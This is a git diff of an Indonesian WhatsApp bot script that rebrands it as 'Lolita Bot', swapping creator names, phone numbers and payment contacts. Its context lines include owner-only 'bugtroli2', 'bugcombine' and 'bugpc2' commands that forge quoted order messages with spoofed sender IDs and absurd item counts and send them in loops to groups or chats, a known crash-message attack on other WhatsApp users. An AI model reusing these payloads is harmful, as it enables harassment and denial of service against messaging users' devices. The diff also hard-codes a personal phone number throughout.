@@ -334,24 +334,24 @@ module.exports = Hisnu = async (Hisnu, mek) => {
         
           
         const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
-            let po = Hisnu.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "𝐹𝑂𝐿𝐿𝑂𝑊 𝐼𝐺 : @𝑘𝑢𝑛𝑧.𝑠𝑡𝑜𝑟𝑒","footerText": "𝐶𝑟𝑒𝑎𝑡𝑜𝑟 : 𝐾𝑢𝑛𝑧𝑥𝐷\n0877-7888-6786","listType": "SINGLE_SELECT","sections": list}}, {})
+            let po = Hisnu.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Donasi yuk","footerText": "Creator: Trito\n085888258313","listType": "SINGLE_SELECT","sections": list}}, {})
             return Hisnu.relayWAMessage(po, {waitForAck: true})
         }
         const katalog = (teks) => {
-            res = Hisnu.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": -73926483, "message": teks, "footerText": "𝐼𝑡𝑠 𝑀𝑒 𝐾𝑢𝑛𝑧 𝐵𝑜𝑡𝑧\n𝐶𝑟𝑒𝑎𝑡𝑜𝑟 : 𝐾𝑢𝑛𝑧𝑥𝐷", "thumbnail": fakeimage, "surface": 'CATALOG' }}, {quoted:ftroli})
+            res = Hisnu.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": -73926483, "message": teks, "footerText": "Lolita Bot\nCreator: Trito", "thumbnail": fakeimage, "surface": 'CATALOG' }}, {quoted:ftroli})
             Hisnu.relayWAMessage(res)
         }        
         const isUrl = (url) => {
             return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
         }
         const cel =  {
-             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagehisnu, surface: 200, message: fake, orderTitle: '𝘽𝙤𝙩𝙯 𝘿𝙝𝙖𝙣𝙞 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩', sellerJid: '0@s.whatsapp.net'} } }       
+             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagehisnu, surface: 200, message: fake, orderTitle: 'Lolita Broadcast', sellerJid: '0@s.whatsapp.net'} } }       
 
         const ftroli =  {
-             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imgcel, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝑫𝒉𝒂𝒏𝒊 𝑮𝒂𝒏𝒔', sellerJid: '0@s.whatsapp.net'} } }       
+             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imgcel, surface: 200, message: fake, orderTitle: 'Lolita Bot\nCreator: Trito', sellerJid: '0@s.whatsapp.net'} } }       
 
         const fkon =  {
-             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: fakeimage, surface: 200, message: rezakon, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝑫𝒉𝒂𝒏𝒊 𝑮𝒂𝒏𝒔', sellerJid: '0@s.whatsapp.net'} } }       
+             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: fakeimage, surface: 200, message: rezakon, orderTitle: 'Lolita Bot\nCreator: Trito', sellerJid: '0@s.whatsapp.net'} } }       
 
         function monospace(string) {
             return '```' + string + '```'
@@ -1116,7 +1116,7 @@ Hisnu.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
                            parseMention = (text = '') => {
                            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}
                            anus = sender
-                           var menu = `*𝙆𝙐𝙉𝙕 𝘽𝙊𝙏𝙕*
+                           var menu = `*Lolita*
 
 *🤖 𝑪𝒓𝒆𝒂𝒕𝒐𝒓 :* @${tagme}
 *🤖 𝑩𝒂𝒕𝒓𝒆𝒂𝒊 :* ${baterai}%
@@ -2274,7 +2274,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
 
                buttonsMessage = {
                contentText: `${menu}`,
-               footerText: '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
+               footerText: '㋡Lolita Bot', imageMessage: imageMsg,
                buttons: buttons,
                headerType: 4
 }
@@ -2589,7 +2589,7 @@ _*Tunggu Proses Upload Media......*_`
               if (!q.includes('tiktok')) return reply(mess.error.Iv)
               buttons = [{buttonId: `${prefix}tiktoknowm ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
               imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage
-              buttonsMessage = {footerText:'㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
+              buttonsMessage = {footerText:'㋡Lolita Bot', imageMessage: imageMsg,
               contentText:`Silahkan pilihan media yg mau di download kak:v`,buttons,headerType:4}
               prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
               Hisnu.relayWAMessage(prep)
@@ -2982,7 +2982,7 @@ v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
 inifile = sendMediaURL(from, v.url, )
 buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
               imageMsg = ( await Hisnu.prepareMessage(from, inifile, 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
-              buttonsMessage = {footerText:'㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
+              buttonsMessage = {footerText:'㋡Lolita Bot', imageMessage: imageMsg,
               contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
               prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
               Hisnu.relayWAMessage(prep)
@@ -3000,7 +3000,7 @@ break
               fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
 		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
               imageMsg = ( await Hisnu.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
-              buttonsMessage = {footerText:'㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
+              buttonsMessage = {footerText:'㋡Lolita Bot', imageMessage: imageMsg,
               contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
               prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
               Hisnu.relayWAMessage(prep)
@@ -3823,7 +3823,7 @@ break
        case 'sourcecode': 
        case 'sc': 
        case 'src':
-              textImg(`𝑴𝒂𝒖 𝑺𝒄 ? 𝑴𝒂𝒌𝒂𝒏𝒚𝒂 𝑩𝒆𝒍𝒊 𝑫𝒊 𝑮𝒘 𝑺𝒄 𝑩𝒖𝒌𝒂𝒏 𝑫𝒂𝒓𝒊 𝒀𝒕`)
+              textImg(`🐒`)
               break
       case 'ping':
       case 'speed':
@@ -4498,7 +4498,7 @@ break
                       "templateMessage": {
 						"hydratedTemplate": {
 							"hydratedContentText": `Hi ${pushname} 👋,\n\n${time} - ${tanggal}`,
-							"hydratedFooterText": `㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧`,
+							"hydratedFooterText": `㋡Lolita Bot`,
 							"hydratedButtons": [
 								{
 									"quickReplyButton": {
@@ -4705,7 +4705,7 @@ case 'antitag':
              for (let _ of anu100) {
              Hisnu.sendMessage(_.jid, 
 			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
-			"footerText": '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧',
+			"footerText": '㋡Lolita Bot',
 			"buttons": [
 			{"buttonId": `#oke`,
 			"buttonText": {"displayText": "Oke Bang 😎"
@@ -4734,7 +4734,7 @@ case 'antitag':
             for (let _ of anu100) {
             Hisnu.sendMessage(_.jid, 
 			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
-			"footerText": '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧',
+			"footerText": '㋡Lolita Bot',
 			"buttons": [
 			{"buttonId": `#allmenu`,
 			"buttonText": {"displayText": "LIST MENU"
@@ -5046,7 +5046,7 @@ menu =`
 웃 ＰＡＹＭＥＮ T  웃 
 *⚠️GOPAY⚠️*
 
-𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
+𝐖𝐀 : https://wa.me/6285888258313`
 katalog(menu)
 break
 case 'jasashare':
@@ -5078,7 +5078,7 @@ menu = `
 웃 ＰＡＹＭＥＮ T  웃 
 *⚠️GOPAY⚠️*
 
-𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
+𝐖𝐀 : https://wa.me/Lolita Bot`
 katalog(menu)
 break
 case 'logojb':
@@ -5102,7 +5102,7 @@ menu = `
 웃 ＰＡＹＭＥＮ T  웃 
 *⚠️GOPAY⚠️*
 
-𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
+𝐖𝐀 : https://wa.me/Lolita Bot`
 katalog(menu)
 break
 case 'sewabotz':
@@ -5120,7 +5120,7 @@ menu = `
 ──────────────────────────────
 ◯ 𝒀𝒐𝒖𝒕𝒖𝒃𝒆 : *https://youtube.com/channel/UCcnWMxH0nUbArCCkqubUeHA*
 ──────────────────────────────
-◯ 𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1
+◯ 𝐖𝐀 : https://wa.me/6285888258313
 ──────────────────────────────
 🔰 -----[「 𝑺𝒆𝒘𝒂 𝑩𝒚 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 」]----- 🔰
 웃 ＰＡＹＭＥＮ T  웃 
@@ -5584,7 +5584,7 @@ case 'listbot':
 └❏
 
 ╭─❒ 「 Bot Info 」 ❒
-│ ⬡ Nama Bot : 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎
+│ ⬡ Nama Bot : Lolita Bot
 │ ⬡ Nama Owner : ${owner}
 │ ⬡ Nomor Owner : ${ownerName}
 │ ⬡ Auto Composing : OFF
@@ -5796,7 +5796,7 @@ buttons = [{buttonId: `${prefix}command`,buttonText:{displayText: 'COMMAND'},typ
 
                buttonsMessage = {
                contentText: `${menu}`,
-               footerText: '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
+               footerText: '㋡Lolita Bot', imageMessage: imageMsg,
                buttons: buttons,
                headerType: 4
 }
@@ -5823,7 +5823,7 @@ res = await Hisnu.prepareMessageFromContent(from,{
 "productImage": imeg,
 "productId": "150453297177375",
 "title": `ALL MENU`,
-"description": `𝐁𝐎𝐓𝐙 𝐃𝐇𝐀𝐍𝐈
+"description": `Lolita Bot
 
 *🤖 𝑪𝒓𝒆𝒂𝒕𝒐𝒓 :* @${owner}
 *🤖 𝑩𝒂𝒕𝒓𝒆𝒂𝒊 :* ${baterai}%
@@ -6276,7 +6276,7 @@ res = await Hisnu.prepareMessageFromContent(from,{
 "productImage": imeg,
 "productId": "1",
 "title": `BETA VERSION`,
-"description": `*KUNZ CUMA NYOBA YA KAWAN*\n*TES DOANG BANG*`,
+"description": `*Lolita CUMA NYOBA YA KAWAN*\n*TES DOANG BANG*`,
 "currencyCode": "USD",
 "priceAmount1000": "999999999999999999",
 "productImageCount": 2
@@ -6333,7 +6333,7 @@ teks = `
 𝑌𝑜𝑘 𝐿𝑎ℎ 𝐾𝑎𝑘 𝐷𝑜𝑛𝑎𝑠𝑖 𝑀𝑎𝑢 𝐵𝑢𝑎𝑡 𝐵𝑒𝑙𝑖 𝑃𝑎𝑘𝑒𝑡𝑎𝑛 😩
 
 ╭─❒ 
-│➪  𝑷𝒖𝒍𝒔𝒂 : 𝟎𝟖𝟏𝟑-𝟑𝟑𝟔𝟎-𝟑𝟓𝟗𝟏
+│➪  𝑷𝒖𝒍𝒔𝒂 : 085888258313
 │➪  𝑮𝒐𝒑𝒂𝒚 : 𝑺𝒄𝒂𝒏 𝑳𝒂𝒉 𝑲𝒂𝒌 🙂 ...
 │➪  𝑫𝒂𝒏𝒂 : 𝑮𝒌 𝑷𝒖𝒏𝒚𝒂 𝑲𝒂𝒌 ...
 │➪  𝑶𝒗𝒐 : 𝑮𝒌 𝑷𝒖𝒏𝒚𝒂 𝑲𝒂𝒌 ...
@@ -6727,7 +6727,7 @@ case 'bugtroli2':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 if (args.length < 1) return reply('Jumlahnya?')
 		        try {
-		        var hets = `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`
+		        var hets = `Lolita Bot`
 		        var grousp = await Hisnu.groupMetadata(from)
                 var membere = grousp['participants']
                 var mems = []
@@ -6751,7 +6751,7 @@ if (args.length < 1) return reply('Jumlahnya?')
 						"itemCount": -3599964009,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
+						"message": `Lolita Bot`,
 						"orderTitle": `${fake}`,
 						"sellerJid": "6285888258313@s.whatsapp.net",
 						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
@@ -6770,7 +6770,7 @@ if (args.length < 1) return reply('Jumlahnya?')
 						"itemCount": -3599964009,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
+						"message": `Lolita Bot`,
 						"orderTitle": `${fake}`,
 						"sellerJid": "6285888258313@s.whatsapp.net",
 						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
@@ -6788,7 +6788,7 @@ break
 case 'bugcombine':
 if (!mek.key.fromMe && !isOwner) return
 Hisnu.toggleDisappearingMessages(from, 'HACKED')
-Hisnu.sendMessage(from, `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, text, {
+Hisnu.sendMessage(from, `Lolita Bot`, text, {
  quoted: {
   key: {
    participant: '0@s.whatsapp.net' // Fake sender Jid
@@ -6798,7 +6798,7 @@ Hisnu.sendMessage(from, `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, text, {
     itemCount: 9999999, // Bug
     status: 1,
     surface: 1,
-    message: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
+    message: `Lolita Bot`,
     orderTitle: `Hisnu`, // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
@@ -6818,7 +6818,7 @@ Hisnu.updatePresence(from, Presence.composing)
 		       Hisnu.sendMessage(from, {degreesLatitude: 34.0184,
 						degreesLongitude: -118.411,
 						name: `Hisnu`,
-						address: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
+						address: `Lolita Bot`,
                         jpegThumbnail: fakeimage },location,{
  quoted: {
   key: {
@@ -6830,7 +6830,7 @@ Hisnu.updatePresence(from, Presence.composing)
     status: 1,
     surface: 1,
     message: `Hisnu`,
-    orderTitle: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, // 
+    orderTitle: `Lolita Bot`, // 
     sellerJid: '0@s.whatsapp.net' // Seller
    }
   }
@@ -6851,7 +6851,7 @@ Hisnu.sendMessage(from, 'yaudah oke',text, {
     itemCount: 70000, // Bug
     status: 1,
     surface: 1,
-    message: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
+    message: `Lolita Bot`,
     orderTitle: `Hisnu`, // 
     sellerJid: '0@s.whatsapp.net' // Seller
    }
@@ -6864,7 +6864,7 @@ case 'bugpc2':
 if (!mek.key.fromMe && !isOwner) return
 if (args.length < 1) return reply('Jumlahnya?')
 for (let i = 0; i < args[0]; i++) {
-Hisnu.sendMessage(from, `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, MessageType.extendedText,{
+Hisnu.sendMessage(from, `Lolita Bot`, MessageType.extendedText,{
  quoted: {
 key: {
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
